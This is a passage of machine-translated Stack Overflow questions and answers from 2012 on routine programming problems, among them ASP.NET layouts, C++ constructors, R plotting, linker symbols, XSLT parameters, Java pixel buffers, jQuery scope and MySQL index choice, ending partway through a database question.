> 赞同：2
> 
> 时间：2012-11-23T16:40:53.480

像上面一样创建模型

在您的索引模板中，将 ViewBag.Description 设置为 Model.Description

```
@{
    _Layout = "Layout.cshtml";
    ViewBag.Description = Model.Description;
}

<div>Hello John </div> 
```

在布局页面中使用 viewbag 而不是模型

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
    <head>
        <title>@ViewBag.Description</title>
    </head>
    <body>
        <div id="content">
            @RenderBody()
        </div> 
        @if (IsSectionDefined("Footer"))
        { 
            <div id="footer">
                @RenderSection("Footer")
            </div>
        }
    </body>
</html> 
```

不知道为什么布局页面不能使用动态模型。这就是我在项目中使用它的方式

# calculated-columns - 将一年中各月的总使用量制成表格

> ID：13328115
> 
> 赞同：1
> 
> 时间：2012-11-11T02:35:08.303
> 
> 标签：calculated-columns

我想列出客户表按月使用的总消费量

```
 Date              Reading
-------          ----------
02-dec-11         750
03-jan-12         1000
05-feb-12         1250
  .
  .
  .
05-dec-12         2300 
```

预期成绩

```
Month               Total 
-------           ---------
JAN                 250 (1000-750)
FEB                 250 (1250-1000)
  .
  . 
```

.

# c++ - 从同一类中的另一个调用一个构造函数

> ID：13328118
> 
> 赞同：2
> 
> 时间：2012-11-11T02:35:48.337
> 
> 标签：c++, class, constructor, compiler-errors

1) 第一个代码

```
class A
{
public:
    int i;
    int b;
    A(int temp){
        i=temp;
        A();
        b=0;
    }

    A(){
        b=0;
    }

    void display(){
        printf("%d %d\n",i,b);//1 0
    }
};

int  main(){
    A Aobj(1);
    Aobj.display();
    return 0;
} 
```

输出：1 0

2) 第二代码

```
class A
{
public:
    int i;
    int b;
    A(int temp) : i(temp), A(), b(0) {}//Error
    A() : b(0) {}
    void display(){
        printf("%d %d\n",b,i);
    }
};

int  main()
{
    A Aobj(1);
    Aobj.display();
    return 0;
} 
```

我原以为这两个代码都将显示相同的行为，并且会产生错误，因为不允许从同一个类中的另一个构造函数调用一个构造函数。**它不是 C++11。**

那么为什么使用初始化器列表会有所不同呢？我在 g++ 4.3.4 中编译了这些代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T02:56:21.120

`A();`没有做你认为它做的事情。

将其替换为`double();`or`char();`或任何其他类型。请注意，它有效。

您所做的只是创建该类型的匿名附加实例，然后将其丢弃。它没有影响`this`，也不会做你认为它做的事情。

初始化器列表在 C++11 中以您期望的方式工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-27T20:52:09.857

这与 C++11 完全无关。

正如 Yakk 在第一种情况下指出的那样，您通过不同的构造函数（默认构造函数）非递归地构造一个匿名成员。

如果是“B”；您尝试从 initialzier 列表中初始化一个不存在的成员。您没有要初始化的实例`A`或`A*`现有实例。`A`

# r - 带有图例的通用情节

> ID：13328119
> 
> 赞同：0
> 
> 时间：2012-11-11T02:35:52.173
> 
> 标签：r, function, plot, arguments, legend

鉴于我有 2 个系列 + 图例，实现通用绘图方法的最佳方法是什么？问题是我想为颜色和图例提供一些不错的默认值，但用户应该可以自由更改它：

```
obj = list(y1 = runif(100, 0, 10), y2 = runif(100, 20, 30))
class(obj) = 'foo'

plot.foo = function(myobj, col1 = 'red', col2 = 'blue', type = 'l', ...)
{
 ylim = c(min(obj$y1, obj$y2), max(obj$y1, obj$y2))
 plot(myobj$y1, type = type, col = col1, panel.first = grid(col = '#A9A9A9'), ylim =  ylim, ...)
 lines(myobj$y2, col = col2, type = type, ...)
}

plot(obj) 
```

这看起来不错，但如果我打电话

```
plot(obj, col = 'black') 
```

它引发了一个错误：

```
Error in plot.foo(obj, col = "black") : 
argument 2 matches multiple formal arguments 
```

有没有办法在不破坏*情节*协议的情况下处理 2 系列 + 传奇？（另一个问题是同步图例*lwd*和*pch*参数）

如果我乘坐 ... arg，CRAN 会拒绝我的包裹吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T03:07:59.110

你可以有一个没有默认值的名为 cols 的向量。然后您可以添加：

```
 if(missing(cols)){
      col1= "red"
      col2 = "black"
  } else {
     col1=cols[1]
     col2=cols[2]
  } 
```

肯定有更好的方法可以做到这一点，但我只是想我会把它扔掉。

# python - 一种我不知道的 Python 使用方法

> ID：13328121
> 
> 赞同：0
> 
> 时间：2012-11-11T02:35:53.270
> 
> 标签：python

在这个快速排序功能中：

```
def qsort2(list):
    if list == []: 
        return []
    else:
        pivot = list[0]
        # can't understand the following line
        lesser, equal, greater = partition(list[1:], [], [pivot], [])
    return qsort2(lesser) + equal + qsort2(greater)

def partition(list, l, e, g):
    if list == []:
        return (l, e, g)
    else:
        head = list[0]
        if head < e[0]:
            return partition(list[1:], l + [head], e, g)
        elif head > e[0]:
            return partition(list[1:], l, e, g + [head])
        else:
            return partition(list[1:], l, e + [head], g) 
```

我不明白评论下面的句子。有人能告诉我这里这句话是什么意思吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-11T02:39:03.153

它将一个元组解压缩为三个变量。

```
def foo():
    return (1, 2, 3)

a, b, c = foo()
print(a) # prints "1"
print(b) # prints "2"
print(c) # prints "3" 
```

# git - 如何在git中合并刚刚从其他分支添加的文件？

> ID：13328124
> 
> 赞同：1
> 
> 时间：2012-11-11T02:36:58.737
> 
> 标签：git, octopress

我想知道是否可以进行选择性合并，只需合并回添加的文件（即文件大小从 0 字节更改为某个数字的某个分支中的文件）？

原因是 octopress`generate`太慢了，以至于我创建了一个分支，只剩下 3 或 5 个帖子来帮助我编写自己的插件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T02:44:27.260

你必须清楚地理解一件基本的事情：

合并时，合并的**不是文件**，而是**变更集**（变更集是*原子对象*）

有了这些知识，您将能够回答自己的问题：“如果您可以在源分支中找到带有纯文件添加的变更集，则您只能将添加的文件从一个分支合并到另一个分支”

# iphone - iOS App 中的按钮不会显示

> ID：13328128
> 
> 赞同：1
> 
> 时间：2012-11-11T02:37:56.370
> 
> 标签：iphone, objective-c, ios, tableview

我正在创建一个 iPhone 应用程序，但在`TableView`添加和添加按钮时遇到了一些问题。我从常规视图开始，然后添加了一个表格视图，然后在顶部添加了几个按钮，如下所示：

![表视图图像](../Images/8a78c92224f5386e6f0d62d68fece8b8.png)

问题是，当我运行应用程序时，我得到了这个：

![在此处输入图像描述](../Images/72063eb97e62490ed352ce2e884a00c9.png)

我添加的两个按钮都不存在。这是我的 .h 文件：

```
 //
//  RootBeerTVCViewController.h
//  BaseApp
//
//  Created by Blaine Anderson on 10/12/12.
//  Copyright (c) 2012 UIEvolution, Inc. All rights reserved.
//

#import <UIKit/UIKit.h>

@interface RootBeerTVCViewController : UIViewController <UITableViewDelegate, UITableViewDataSource>

@property (weak, nonatomic) IBOutlet UIButton *nameButton;
@property (weak, nonatomic) IBOutlet UIButton *locationButton;
@property(strong, nonatomic) NSMutableArray* rootList; 

-(IBAction)sort:(id)sender;

@end 
```

这是 .M 文件：

```
//
//  RootBeerTVCViewController.m
//  BaseApp
//
//  Created by Blaine Anderson on 10/12/12.
//  Copyright (c) 2012 UIEvolution, Inc. All rights reserved.
//

#import "RootBeerTVCViewController.h"
#import "GlobalData.h"

@interface RootBeerTVCViewController ()

@end

@implementation RootBeerTVCViewController
@synthesize rootList; 

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization

    }
    return self;
}

- (void)viewDidLoad
{
    [super viewDidLoad];

    [GlobalData sharedData].mViewManager.mNavController.navigationBarHidden=NO;

    // Do any additional setup after loading the view from its nib.
    rootList = [[GlobalData sharedData] mRootList ];
     NSLog(@"RootList in view did load: %@", rootList);
    UITableView *tableView = [[UITableView alloc] initWithFrame:[[UIScreen mainScreen] applicationFrame] style:UITableViewStylePlain];

    tableView.autoresizingMask = UIViewAutoresizingFlexibleHeight|UIViewAutoresizingFlexibleWidth;

    tableView.delegate = self;

    tableView.dataSource = self;

    //[tableView addSubview:sortingView]; 

    [tableView reloadData];

    self.view = tableView;
}

- (void)viewDidUnload
{

    [self setLocationButton:nil];
    [self setNameButton:nil];
    [super viewDidUnload];
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}
#pragma mark - Table view data source

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    rootList = [[GlobalData sharedData] mRootList ];
    NSLog(@"RootList: %@", rootList);
    // Return the number of sections.
    NSLog(@"RootList count: %i", rootList.count);
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    // Return the number of sections.
    NSLog(@"RootList row count: %i", rootList.count);
    return rootList.count;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    rootList =[[GlobalData sharedData].mRootBeerParser rootBeerList];
    NSLog(@"RootList Cell: %@", rootList);
    RootBeers* mRootBeer = [rootList objectAtIndex:indexPath.row];

    static NSString *CellIdentifier = @"Cell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if(cell == nil){
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle  reuseIdentifier:@"Cell"]; 
        cell.selectionStyle = UITableViewCellSelectionStyleNone;
    }
    NSLog(@"Cell Name: %@", mRootBeer.brewer);
    // Configure the cell...
    cell.textLabel.text = mRootBeer.name; 
    cell.detailTextLabel.text = mRootBeer.location; 

    return cell;
}

/*
 // Override to support conditional editing of the table view.
 - (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath
 {
 // Return NO if you do not want the specified item to be editable.
 return YES;
 }
 */

/*
 // Override to support editing the table view.
 - (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath
 {
 if (editingStyle == UITableViewCellEditingStyleDelete) {
 // Delete the row from the data source
 [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
 }   
 else if (editingStyle == UITableViewCellEditingStyleInsert) {
 // Create a new instance of the appropriate class, insert it into the array, and add a new row to the table view
 }   
 }
 */

/*
 // Override to support rearranging the table view.
 - (void)tableView:(UITableView *)tableView moveRowAtIndexPath:(NSIndexPath *)fromIndexPath toIndexPath:(NSIndexPath *)toIndexPath
 {
 }
 */

/*
 // Override to support conditional rearranging of the table view.
 - (BOOL)tableView:(UITableView *)tableView canMoveRowAtIndexPath:(NSIndexPath *)indexPath
 {
 // Return NO if you do not want the item to be re-orderable.
 return YES;
 }
 */

#pragma mark - Table view delegate

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{

    RootBeers* mRootBeer =[rootList objectAtIndex:indexPath.row]; 
    [GlobalData sharedData].mRootBeer = mRootBeer; 
    [[GlobalData sharedData].mViewManager pushView:DETAILVIEW animated:YES]; 

}

- (IBAction)sort:(id)sender {

    rootList =[[GlobalData sharedData].mRootBeerParser rootBeerList];

    [[GlobalData sharedData].mRootBeerParser sortRootBeerByName:rootList]; 
}
@end 
```

如果有人能让我知道我做错了什么，那就太好了。我希望我已经提供了足够的信息，如果没有，请告诉我，我很乐意提供更多信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T02:45:49.810

在您`viewDidLoad`创建一个新`UITableView`的屏幕大小，然后将其设置为 VC 视图，从而覆盖从 xib 加载的视图。因此，您只能看到您在代码中创建的表。

# ms-access - 如何在不同场景下以可编辑和不可编辑模式打开同一个访问表单

> ID：13328133
> 
> 赞同：1
> 
> 时间：2012-11-11T02:39:25.820
> 
> 标签：ms-access

我正在使用 Access 2010 中的表单。我对同一个表单有两个要求，它们是由两个不同的人完成的活动。一个将数据输入表单，另一个检查数据。输入数据的人不能编辑已经可用的记录。编辑记录的人可以打开数据并编辑详细信息。请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T02:59:22.233

如果您使用[Docmd.Openform](http://msdn.microsoft.com/en-us/library/office/bb238021%28v=office.12%29.aspx)使用代码打开表单，您可以设置`DataMode`为`acFormAdd`，这将使表单只能添加新记录。或者，您可以使用`acFormEdit`来指示编辑和新记录并完成。

如果您是直接打开表单，您可以在表单打开时设置选项。

如果您希望表单只允许新记录，请执行以下操作：

```
Private Sub Form_Load()
    If 'your condition then
        Me.DataEntry = True
    end if
End Sub 
```

# java - 如何将 NSDate 转换为整数以将 PHP date() 作为 unix 时间戳传递？

> ID：13328134
> 
> 赞同：7
> 
> 时间：2012-11-11T02:40:00.050
> 
> 标签：java, objective-c, integer, nsdate

我是一名 Objective-c 初学者，我被分配为我们的客户创建一个 iPhone 应用程序。我有一些Java背景，但在这个objective-c方面几乎没有经验，这是我第一次开发一个完整的应用程序......

无论如何，我目前正面临几个问题。其中一个问题是我需要`date`从我的 iOS 应用程序中为 PHP 的函数发送一个整数值。我一直在寻找解决方案，但他们都在处理相反的方式（int to `NSDate`），而不是`NSDate`整数值。

我尝试了像[在这里](https://stackoverflow.com/questions/358207/iphone-how-to-get-current-milliseconds)回答的解决方案， 但很明显它返回双精度，而不是整数......
或者[这个](https://stackoverflow.com/questions/3681243/is-there-an-objective-c-iphone-version-of-currenttimemillis-from-java) ，但这无法得到`System time`.

我知道我可以通过以下方式获得当前系统的 NSDate：

```
NSDate *theDay = [NSDate dateWithTimeIntervalSinceNow:[[NSTimeZone systemTimeZone] secondsFromGMT]]; 
```

但我不知道如何将其转换为整数（或长整数）值。

我只需要获得与我们可以使用的相同的`Java`值`System.currentTimeMillis()`。

另外，这是我第一次在 stackoverflow 中提问。因此，请让我知道在此处发布问题等时我应该做什么/不做什么。

谢谢你。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-11T02:48:46.677

要获取当前日期，您应该使用以下命令：

```
NSDate *theDate = [NSDate date]; 
```

要在 1970 年 1 月 1 日以来的几秒钟内得到它，作为双精度数，你可以使用：

```
NSTimeInterval seconds = [[NSDate date] timeIntervalSince1970]; 
```

要以毫秒为单位，只需将前一个值乘以 1000，然后让编译器将其转换为整数，而无需任何额外代码：

```
long long milliseconds = [[NSDate date] timeIntervalSince1970] * 1000; 
```

正如@HotLicks 指出的那样，`System.currentTimeMillis()`在格林威治标准时间时，如果您需要当地时间，您可以使用：

```
long long milliseconds = ([[NSDate date] timeIntervalSince1970] 
                        + [[NSTimeZone defaultTimeZone] secondsFromGMT]) * 1000; 
```

（我认为大多数网络服务都需要 GMT。）

# google-app-engine - GAE JDO：第二次读取时默认获取组成员 null

> ID：13328138
> 
> 赞同：2
> 
> 时间：2012-11-11T02:40:17.253
> 
> 标签：google-app-engine, jdo, datanucleus

我有一个像这样的持久类：

```
@PersistenceCapable(detachable = "true")
public class MyClass {
    ...
    @Persistent(defaultFetchGroup = "true")
    @Element(dependent = "true")
    private Set<Key> mySet = new HashSet<Key>(); 
    ...
} 
```

我首先坚持，然后像这样读回来：

```
pm.getFetchPlan().setGroup(FetchPlan.DEFAULT);
pm.getFetchPlan().setMaxFetchDepth(1);
myInstance = pm.getObjectById(MyClass.class, key); 
```

奇怪的是，这在服务器重新启动后第一次运行良好。但是，我第二次进行查询时，mySet 仍然为空。

我一直在尝试使用 ArrayList，但没有运气。我完全不知道什么可能导致这样的行为，所以任何关于可能是什么原因的模糊指针都将不胜感激。

**更新：**

我找到了一个修复程序，但我不明白它为什么会起作用。如果我为 User 添加一个复制构造函数并在读取后复制实例，它会始终如一地工作。我会假设有一个缓存总是将相同的实例交还给我，但是单步执行程序时，我找不到任何将角色设置为空的代码。这可能是我忽略的副作用还是我不理解的更基本的问题？

# linux - 链接到 libcurl 时 _end 符号消失

> ID：13328144
> 
> 赞同：-1
> 
> 时间：2012-11-11T02:41:33.233
> 
> 标签：linux, linker, gnu

在 Linux 上，D 运行时库依赖于`_end`符号来确定 GC 根范围 ( `man 3 end`)，这实际上与 Boehm GC 所做的非常相似。但是，在 libcurl 中链接时，链接器不再找到该符号：

```
$ cat test.c
#include <stdio.h>

extern char _end[];
int main() {
    printf("%p\n", &_end);
    return 0;
}

$ gcc test.c # works
$ gcc test.c -lcurl
/usr/bin/ld: /tmp/ccOPtbEv.o: undefined reference to symbol '_end'
/usr/bin/ld: note: '_end' is defined in DSO /usr/lib/libssl.so.1.0.0 so try adding it to the linker command line
/usr/lib/libssl.so.1.0.0: could not read symbols: Invalid operation
collect2: error: ld returned 1 exit status 
```

从 D 论坛上快速搜索，libpq、libdw 和其他几个库似乎触发了同样的问题。知道这里会发生什么吗？**`test.c`甚至不依赖于 libcurl 中的符号。**（Arch Linux x86_64、GCC 4.7.2、ld 2.23）

另外，请注意“尝试在 libssl 中链接”不是我正在寻找的答案，我想了解这里发生了什么。我正在尝试在我正在研究的编译器中解决此问题，因此您可以假设基本熟悉链接过程的工作原理。

编辑：我对告诉用户只在 libssl 中链接，...，明确表示不是特别满意的原因是`pkg-config --libs curl`,`curl-config --libs`等不包含此信息；因此，要求它会破坏构建系统。如果有人对确定数据（初始化和 BSS）段的边界有更好的想法，我很想知道。

编辑2：使用上面提到的工具链，`end`（没有下划线）似乎也被定义了，它不会触发问题。不过，仍然对它发生的原因感到困惑。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-10T16:00:18.483

_end 符号由链接器提供。它指向 bss 中的最后一个对象。但是，这只是一个约定，没有标准要求这样做。显然，您的工具链的链接器没有这样做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T06:50:26.207

> 请注意，“尝试在 libssl 中链接”不是我要寻找的答案。

但很可能它实际上*是*您正在寻找的答案。你的命令行*全错了*。试试这个：

```
gcc test.c -lcurl 
```

库和源的顺序，命令行上的对象很重要。

# xml - XSLT 传递参数

> ID：13328145
> 
> 赞同：2
> 
> 时间：2012-11-11T02:41:39.053
> 
> 标签：xml, xslt, parameters

我一直在看其他问题，但我不太明白我做错了什么。我想传递一个参数来仅选择某些结果，但我遇到了参数问题。

html（忽略 IE 部分）

```
<html>
<head>
<script>
function loadXMLDoc(dname)
{
if (window.XMLHttpRequest)
  {
  xhttp=new XMLHttpRequest();
  }
else
  {
  xhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xhttp.open("GET",dname,false);
xhttp.send("");
return xhttp.responseXML;
}

function displayResult()
{
xml=loadXMLDoc("f.xml");
xsl=loadXMLDoc("xsl.xsl");
// code for IE
if (window.ActiveXObject)
  {
  ex=xml.transformNode(xsl);
  document.getElementById("example").innerHTML=ex;
  }
// code for Mozilla, Firefox, Opera, etc.
else if (document.implementation && document.implementation.createDocument)
  {
  xsltProcessor=new XSLTProcessor();
  xsltProcessor.importStylesheet(xsl);

  xsltProcessor.setParameter(null, "testParam", "voo");
  // alert(xsltProcessor.getParameter(null,"voc"));

  document.getElementById("example").innerHTML = "";

  resultDocument = xsltProcessor.transformToFragment(xml,document);
  document.getElementById("example").appendChild(resultDocument);
  }

}

</script>
</head>
<body onload="displayResult()">
    <li><u><a onclick="displayResult();" style="cursor: pointer;">test1</a></u></li>
<div id="example" />
</body>
</html> 
```

xml

```
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="vocaroos.xsl"?>
<test>
    <artist name="Bert">
        <voo>bert1</voo>
    </artist>
    <artist name="Pet">
        <voo>pet1</voo>
    </artist>
</test> 
```

xsl

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:param name="testParam"/>
<xsl:template match="/">
  <html>
  <body >
  <h2>Titleee</h2>
  <table border="1">
    <tr bgcolor="#9acd32">
      <th>Teeeeeest</th>
    </tr>
    <xsl:for-each select="test/artist">
    <tr>
      <td><xsl:value-of select="$testParam"/></td>
    </tr>
    </xsl:for-each>
  </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet> 
```

这是结果（左）

![结果](../Images/91b63521d8489588a7ce84ead0d9d9ca.png)

左边是它的作用，右边是我真正想要的。我期待着

```
<xsl:value-of select="$testParam"/> 
```

会做同样的事情

```
<xsl:value-of select="voo"/>     (right outcome) 
```

因为我做了 setParameter(null, "testParam", "voo"); 在 html 中，但由于某种原因，xsl 不使用“voo”作为选择，而是写入“voo”。

我一直在尝试不同的东西，但没有任何效果。哪里错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T17:51:40.227

参数的值是字符串“voo”，这就是为什么应用于参数的xsl:value-of会返回字符串“voo”。没有理由期望 XSLT 处理器将“voo”视为要计算的 XPath 表达式。

如果参数的值是元素名称，并且您想选择具有该名称的元素，则可以执行 select="*[name()=$testParam]" 之类的操作。如果它是一个更通用的 XPath 表达式，那么您将需要一个 xx:evaluate() 扩展。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T06:40:31.947

XSLT 在 1.0 或 2.0 中都不进行动态评估。某些扩展功能，例如[`saxon:evaluate`](http://www.saxonica.com/documentation/extensions/functions/evaluate.xml)允许这样做，但它们的可用性取决于您使用的 XSLT 引擎。XSLT 3.0 建议在本机添加了这一点，[`xsl:evaluate`](http://www.w3.org/TR/xslt-30/#element-evaluate)但很少有 XSLT 引擎实现了 3.0 支持（saxon 就是其中之一）。

# java - 使用 BufferedImage 的 DataBuffer 设置像素

> ID：13328148
> 
> 赞同：2
> 
> 时间：2012-11-11T02:42:51.733
> 
> 标签：java, bufferedimage

我正在尝试使用类型的底层`DataBufferByte`来尽可能快地设置像素值。`BufferedImage``TYPE_3BYTE_BGR`

也许我不理解，但是当我执行以下操作时...

```
byte[] imgBytes = ((DataBufferByte) img.getData().getDataBuffer()).getData(); 
```

...似乎我得到了 byte[] 的副本而不是参考。例如，如果我运行...

```
System.out.println(System.identityHashCode(imgBytes));
System.out.println(System.identityHashCode((DataBufferByte) img.getData().getDataBuffer()).getData()); 
```

...我得到两个明显不同的对象哈希。如果我没记错的话，这表明我没有得到对底层 byte[] 的引用，而是一个副本。如果是这种情况，我应该如何`DataBufferByte`直接编辑？？？

或者我只是设置错误的像素......当我在 imgBytes 中设置像素时，它似乎对 BufferedImage 没有任何作用。一旦我得到字节 []，我将每个像素值设置如下：

```
imgBytes[intOffset] = byteBlue;
imgBytes[intOffset+1] = byteGreen;
imgBytes[intOffset+2] = byteRed; 
```

对我来说，这一切似乎都很好。我可以通过这种方式很好地读取像素，所以看起来我应该能够以相同的方式编写它们！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-12-09T15:16:53.490

我有同样的问题。您可能不使用 getData() 但使用 getRaster() 它为您提供了一个可用于写入的数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T03:00:34.417

我曾经玩过 Java 中图像的像素操作。我不会直接回答您的问题，而是为您的问题提供替代解决方案。您可以执行以下操作来创建要操作的像素数组：

```
final int width = 800;
final int height = 600;
final int[] pixels = new int[width * height]; // 0xAARRGGBB
MemoryImageSource source = new MemoryImageSource(width, height, pixels, 0, width);
source.setAnimated(true);
source.setFullBufferUpdates(true);
Image image = Toolkit.getDefaultToolkit().createImage(source);
image.setAccelerationPriority(1f); 
```

然后要绘制图像，您可以简单地从 Graphics 类调用[drawImage方法。](http://docs.oracle.com/javase/7/docs/api/java/awt/Graphics.html#drawImage%28java.awt.Image,%20int,%20int,%20java.awt.image.ImageObserver%29)

还有其他几种方法可以实现您正在寻找的东西，但这种方法对我来说是最简单的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-13T18:37:53.047

这是它在JDK7中的实现方式。如果这些东西对您不起作用，您可能会在其他地方遇到错误。

```
public byte[] getData() {
    theTrackable.setUntrackable();
    return data;
} 
```

# jquery - 变量在函数之外不会改变

> ID：13328149
> 
> 赞同：0
> 
> 时间：2012-11-11T02:43:11.730
> 
> 标签：jquery, forms, variables

JSFiddle：http: [//jsfiddle.net/veksen/7TRgE/1/](http://jsfiddle.net/veksen/7TRgE/1/)

如果我从函数内部调用变量值，它就可以工作。但是，如果我在函数之外调用它，则不会。

我觉得它与改变有关，因为它首先分配好，但不会改变。

```
var diff_res = { norm:0, nm:-40, hell:-100 };
var difficulty = "hell"; 
$("select").change(function () {
    difficulty = $("select option:selected").val();
    $(".inside").text(diff_res[difficulty]);
})
.change();

var char_fr = 30;
char_fr += diff_res[difficulty];

$(".outside").text(diff_res[difficulty]); 
```

​</p>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T02:46:40.320

`.inside`有一个事件说：“如果有人改变我 [...]”。`.outisde`没有事件。所以：

```
$(".outside").text(diff_res[difficulty]); 
```

只会执行一次。

见[http://jsfiddle.net/7TRgE/2/](http://jsfiddle.net/7TRgE/2/)

选择的选项是：“nm”，默认值为“-40”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T02:51:51.120

**更新：**

通过重新执行，我的意思是这样的：

```
$(document).ready(function () {
    'use strict';
    var diff_res = {
            norm: 0,
            nm: -40,
            hell: -100
        },
        difficulty = "hell",
        char_fr = 30,
        changeOutside = function changeOutside() {
            $(".outside").text(diff_res[difficulty]);
        };
    $("select").change(function () {
        difficulty = $("select option:selected").val();
        $(".inside").text(diff_res[difficulty]);
        changeOutside();
    }).change();
    char_fr += diff_res[difficulty];
}); 
```

关键`$(".outside").text(diff_res[difficulty]);`是它只在加载 DOM 时执行一次，这就是`text()`最初设置为`-100`. 要`.outside`再次更改，您需要重新运行`$(".outside").text(diff_res[difficulty]);`

**原来的：**

你的问题是：

```
$(".outside").text(diff_res[difficulty]); 
```

在函数中只执行一次`$(document).ready()`。如果您希望它更频繁地更改，则需要在`change`处理程序中重新执行它。

# data-structures - 使用哈希表实现图

> ID：13328150
> 
> 赞同：1
> 
> 时间：2012-11-11T02:43:16.580
> 
> 标签：data-structures, hash, graph, hashtable, theory

我理解它背后的“理论”。是某种类型或数组的链表，它们在数组中的位置是执行“hashFuction(element) mod array.length”的结果，并且您使用该列表来管理冲突。

我的问题是，数组的最佳长度实际上是多少？我们正在使用最多 20,000 个节点的图。但我认为 20,000 个元素的数组已经太低效了。

我正在考虑创建一个长度为 X 的数组，然后如果它达到这么多元素，则执行诸如将所有元素复制到 2X 的数组之类的操作，但问题是它们不会对元素具有相同的索引，而我实际上可以“复制“所有数组，我需要为每个元素应用哈希函数来找到它们的新位置，如果我谈论的是一个 10,000 个元素的数组，这将非常非常慢。

对不起我的语法错误，英语不是我的母语。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-01T20:00:08.443

您所描述的本质上是一个链式哈希表，您的问题归结为如何调整该表的大小以节省空间。我认为您正在过度设计您的解决方案。相反，只需在您选择的编程语言中使用标准的、现成的哈希表实现。它可能比您想出的任何东西都更加优化，并且可能会有更少的错误。

希望这可以帮助！

# javascript - 声音脚本播放开/关

> ID：13328152
> 
> 赞同：1
> 
> 时间：2012-11-11T02:44:28.407
> 
> 标签：javascript

我们正在开发一个项目，该项目有一个页面，我们正在比较 4 种不同的声音。我们使用的脚本可以很好地播放每个声音，但是您可以按下每个链接，并且所有 4 个都可以同时播放。我们正试图弄清楚如何制作它，以便一次只播放一种声音。如果按声音“A”然后按声音“B”，声音“A”应该关闭，“B”将播放。

```
var html5_audiotypes={ 
"mp3": "audio/mpeg",
"ogg": "audio/ogg",
}
function createsoundbite(sound){
var html5audio=document.createElement('audio')
if (html5audio.canPlayType){ 
    for (var i=0; i<arguments.length; i++){
        var sourceel=document.createElement('source')
        sourceel.setAttribute('src', arguments[i])
        if (arguments[i].match(/\.(\w+)$/i))
            sourceel.setAttribute('type', html5_audiotypes[RegExp.$1])
        html5audio.appendChild(sourceel)
    }
    html5audio.load()
    html5audio.playclip=function(){
        html5audio.pause()
        html5audio.currentTime=0
        html5audio.play()
    }
    return html5audio
} 
```

# gwt - 使用 golang 作为 gwt 的后端时如何通过主机页面传递数据？

> ID：13328153
> 
> 赞同：1
> 
> 时间：2012-11-11T02:44:31.683
> 
> 标签：gwt, go

目前，我的配置是这样的：

```
gwt+nginx+golang 
```

，并且 nginx 作为代理将所有请求（在端口：80 上）重定向到 golang 服务器（在端口：8080 上）。因为我使用 golang 作为后端，所以我希望用户通过以下方式访问我的网站

```
www.domain.com 
```

直接不指定主机页面，如下所示：

```
www.domain.com/index.html. 
```

我认为在生产模型中应该很容易：只需将所有请求代理到 golang 服务上，问题在于开发模型：没有主机页面，如何让 gwt 应用程序运行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T03:55:33.590

DevMode 实际上并没有什么不同。在您的服务器上部署一次编译版本，然后在传递它的[`-noserver`模式下](https://developers.google.com/web-toolkit/doc/latest/DevGuideCompilingAndDebugging#How_do_I_use_my_own_server_in_development_mode_instead_of_GWT%27s)`-startupUrl http://www.domain.com`运行 DevMode 。它应该只是工作™。

# mysql - 为什么 MySQL 选择似乎效率较低的索引？

> ID：13328154
> 
> 赞同：0
> 
> 时间：2012-11-11T02:44:34.293
> 
> 标签：mysql, indexing, foreign-keys, data-warehouse

我继承的一些数据库/查询有问题。这是针对一些大型数据集和对它们进行的报告。

我正在尝试调整和调整以获得一些改进。

发生的事情是我不是 100% 清楚 MySQL 如何决定使用哪个索引。

为什么下面列出的第一个查询不使用查询 2 中使用的索引。在查询 2 中，我正在做我*假设*查询引擎应该做的事情，获取小表，获取适当的值，然后应用它们搜索更大的表，并利用适当的索引。

我在这里做错了什么？或者更确切地说，我对外键、索引和连接在这里的工作方式有什么误解:)

这是2个相关表

表 1
~450 行

```
CREATE TABLE `client_accounts_dim` (
